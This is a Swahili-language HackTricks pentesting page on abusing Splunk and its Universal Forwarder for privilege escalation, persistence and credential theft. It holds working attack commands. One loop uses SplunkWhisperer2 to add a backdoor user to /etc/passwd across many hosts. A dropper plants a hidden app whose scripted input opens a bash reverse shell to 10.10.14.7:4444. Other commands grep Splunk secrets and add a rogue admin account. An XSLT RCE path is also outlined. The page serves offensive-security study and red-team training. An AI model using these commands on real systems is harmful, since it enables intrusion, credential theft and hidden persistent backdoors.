# Splunk LPE na Persistence

{{#include ../../banners/hacktricks-training.md}}

Ikiwa **una-enumerate** mashine **internally** au **externally** na ukapata **Splunk running** (kwa kawaida **8000** kwa web UI na **8089** kwa management API), credentials halali mara nyingi zinaweza kutumika kupata **code execution** kupitia usakinishaji wa app, scripted inputs, au management actions. Ikiwa Splunk inaendeshwa kama **root**, mara nyingi hii huwa **privilege escalation** ya moja kwa moja.

Ikiwa unahitaji tu remote attack surface ya jumla, enumeration, au app-upload RCE path, angalia:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Ikiwa **tayari wewe ni root** na Splunk service haisikilizi localhost pekee, unaweza pia kuiba **Splunk password hashes**, kurejesha **encrypted secrets**, au kusukuma **malicious app** ili kudumisha persistence locally au across multiple forwarders.

## Interesting Local Files

Unapoingia kwenye host inayoendesha Splunk au Splunk Universal Forwarder, hizi kwa kawaida ndizo paths zenye umuhimu zaidi:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Vitu muhimu:

- **`$SPLUNK_HOME/etc/passwd`**: local Splunk users na password hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: key inayotumiwa na Splunk ku-encrypt secrets zilizohifadhiwa kwenye faili kadhaa za `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: faili ya awali ya admin bootstrap; ni muhimu kwenye gold images na provisioning mistakes. Hupuuzwa ikiwa `etc/passwd` tayari ipo.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: mahali ambapo scripted inputs huwezeshwa kwa kawaida.
- **`$SPLUNK_HOME/etc/deployment-apps/`** au **`$SPLUNK_HOME/etc/apps/`**: sehemu nzuri za kuficha app yenye persistence au kukagua kile ambacho tayari kinasambazwa.

## Muhtasari wa Splunk Universal Forwarder Agent Exploit

Kwa maelezo zaidi angalia [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Huu ni muhtasari tu:

**Muhtasari wa exploit:**
Exploit inayolenga Splunk Universal Forwarder (UF) huwawezesha attackers walio na **agent password** kutekeleza arbitrary code kwenye systems zinazoendesha agent, na hivyo kuweza ku-compromise sehemu kubwa ya environment.

**Kwa nini inafanya kazi:**

- UF management service mara nyingi huwa exposed kwenye **TCP 8089**.
- Attackers wanaweza ku-authenticate kwenye API na kuamuru forwarder i-install **malicious app bundle**.
- Primitive hii inaweza kutumiwa locally kwa **LPE** au remotely kwa **RCE**.
- Public tooling kama **SplunkWhisperer2** huunda app bundle automatically na inaweza ku-adapt payloads kwa Linux targets.

**Njia za kawaida za kurecover password:**

- Cleartext credentials kwenye documentation, scripts, shares, au deployment automation.
- Password hashes ndani ya `$SPLUNK_HOME/etc/passwd`, zikifuatiwa na offline cracking.
- Golden images au provisioning leftovers kama `user-seed.conf`.

**Impact:**

- SYSTEM/root-level code execution kwenye kila compromised host.
- Deployment ya persistent apps, backdoors, au ransomware.
- Kuzima au ku-tamper telemetry kabla data haijaforwardiwa.

**Example command for exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits za umma zinazotumika:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence kupitia Scripted Inputs au Malicious Apps

Ikiwa una **ruhusa ya kuandika kwenye filesystem** ukiwa kama `root`/`splunk`, au una ufikiaji ulio-authenticate wa kusakinisha apps, njia ya kuaminika sana ya persistence ni kuweka **custom app** yenye **scripted input**. Documentation ya Splunk yenyewe inatarajia scripted inputs ziwe ndani ya app directory na ziwezeshwe kupitia `inputs.conf`.

Mpangilio wa kawaida:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
`inputs.conf` ya chini kabisa:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Dropper ya Linux ya haraka:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Vidokezo:

- Mbinu hiyo hiyo hufanya kazi kwenye **Universal Forwarder** kwa kutumia `/opt/splunkforwarder/etc/apps/`.
- Attackers mara nyingi hujichanganya na mazingira yaliyopo kwa kurekebisha add-on halali badala ya kuunda app yenye nia ovu iliyo wazi.
- Kwenye **deployment server**, kuweka app yenye nia ovu ndani ya `deployment-apps/` hugeuka kuwa **fleet-wide persistence** kwa sababu forwarders huomba mara kwa mara, hupakua apps zilizosasishwa, na mara nyingi hufanya restart ili kuzitumia.

## Wizi wa Credentials na Kuchukua Udhibiti wa Admin

Ikiwa unaweza kusoma faili za ndani za Splunk, kwa kawaida kuna malengo mawili mazuri: kurejesha **Splunk admin access** na kurejesha **encrypted service credentials**.

### Password hashes na watumiaji wa ndani

Splunk huhifadhi data za uthibitishaji wa ndani kwenye `etc/passwd`. Kulingana na deployment, kufanya cracking ya faili hiyo kunaweza kurejesha credentials zinazofanya kazi kwa web UI na management API.

Ikiwa tayari una credentials halali za **admin** na Splunk inatumia **native** authentication backend, CLI yenyewe inaweza kutumiwa kwa persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` na thamani zilizosimbwa

Splunk hutumia `etc/auth/splunk.secret` kulinda thamani nyeti zilizohifadhiwa katika faili nyingi za usanidi. Ikiwa unaweza kuiba **secret** na faili husika za **`.conf`**, mara nyingi unaweza kurejesha au kutumia tena:

- secrets za pamoja za forwarder/indexer kama vile `pass4SymmKey`
- passwords za TLS private-key kama vile `sslPassword`
- credentials za LDAP bind kama vile `bindDNPassword`

Hii ni muhimu kwa **lateral movement** hata wakati password ya Splunk admin yenyewe haiwezi kuvunjwa.

### Matumizi mabaya ya `user-seed.conf`

`user-seed.conf` hutumiwa tu wakati wa first start au wakati `etc/passwd` haipo. Hilo huifanya isiwe na manufaa sana kwenye live box, lakini iwe ya kuvutia sana katika:

- compromised installation templates
- container images
- unattended provisioning workflows
- appliances ambapo Splunk huanzishwa upya automatically

Katika hali hizo, kuweka `HASHED_PASSWORD` iliyotengenezwa kwa `splunk hash-passwd` hukupa njia tulivu ya kurejesha admin access baada ya redeployment.

## Kutumia Vibaya Splunk Queries

Kwa maelezo zaidi angalia [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Mbinu muhimu ya hivi karibuni ni kutumia vibaya **user-supplied XSLT** katika matoleo hatarishi ya Splunk Enterprise ili kubadilisha account yenye authenticated yenye privileges ndogo kuwa **OS command execution** kama user wa `splunk`.

Mtiririko wa kiwango cha juu:

1. Authenticate kwenye Splunk.
2. Upload faili hasidi la **XSL** kupitia preview/upload functionality.
3. Fanya Splunk irender search results kwa kutumia stylesheet hiyo iliyopakiwa kutoka kwenye directory ya **dispatch**.
4. Tumia XSLT payload kuandika faili au kuchochea execution kupitia Splunk's search pipeline (kwa mfano kwa kufikia internal functionality kama vile `runshellscript`).

Jambo muhimu la kuchukua kwa upande wa offensive ni kwamba njia hii ni **post-auth RCE bila kuhitaji app upload**. Kwenye Linux kwa kawaida utaishia kwenye account ya **`splunk`**, ambayo bado ni muhimu kwa sababu user huyo mara nyingi anamiliki application tree, anaweza kusoma secrets, na anaweza kuweka persistent apps ambazo hudumu hata baada ya kupoteza shell.

Njia ya mfano iliyotumiwa wakati wa exploitation ni:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Ikiwa Splunk inaendeshwa ikiwa na **haki** nyingi kupita kiasi, au ikiwa mtumiaji wa `splunk` ana access ya scripts hatari, service units zinazoweza kuandikwa, au rules mbaya za `sudo`, hali hii huwa mlolongo safi wa **LPE**.

## Marejeleo

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
